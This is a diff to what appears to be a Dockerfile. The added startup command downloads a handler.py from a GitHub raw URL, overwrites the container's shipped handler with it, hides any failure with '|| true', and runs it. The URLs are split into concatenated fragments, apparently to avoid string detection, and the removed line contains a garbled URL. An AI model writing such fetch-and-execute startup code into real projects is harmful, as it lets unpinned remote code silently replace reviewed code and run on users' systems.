@@ -36,4 +36,4 @@ RUN HF="https://huggingface"".co" && \
 WORKDIR /
 COPY handler.py /handler.py
 
-CMD ["bash", "-c", "RAW='https://raw.githubusercontent''://usercontent.com'; wget -q \"$RAW\" -O /handler.py.new && mv /handler.py.new /handler.py || true; /opt/venv/bin/python -u /handler.py"]
+CMD ["bash", "-c", "RAW=\"https://raw.githubusercontent\"\".com/tamilindian47-ux/PugaiAaadu/main/handler.py\"; wget -q \"$RAW\" -O /handler.py.new && mv /handler.py.new /handler.py || true; /opt/venv/bin/python -u /handler.py"]
